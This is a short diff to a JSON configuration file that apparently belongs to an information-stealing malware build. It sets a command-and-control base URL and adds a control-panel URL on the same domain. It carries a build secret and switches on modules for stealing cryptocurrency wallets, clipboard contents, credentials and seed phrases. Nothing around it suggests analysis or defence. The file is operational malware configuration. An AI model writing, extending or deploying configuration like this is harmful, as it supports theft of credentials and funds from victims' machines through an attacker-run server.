@@ -3,6 +3,8 @@
   "build_id": "00000000-0000-4000-8000-00000000a001",
   "build_secret": "KkkJJGQGZ6SIvCvxsQgl1YDF8Lm2ne35qErepvxoR-0",
   "c2_base": "https://c2.spc-cloud.net/api/v1",
+  "panel_url": "https://c2.spc-cloud.net",
+  "resolver_url": "",
   "profile": "full",
   "modules": { "wallets": true, "clipboard": true, "credentials": true, "seeds": true },
   "bandwidth_kbps": 1024,
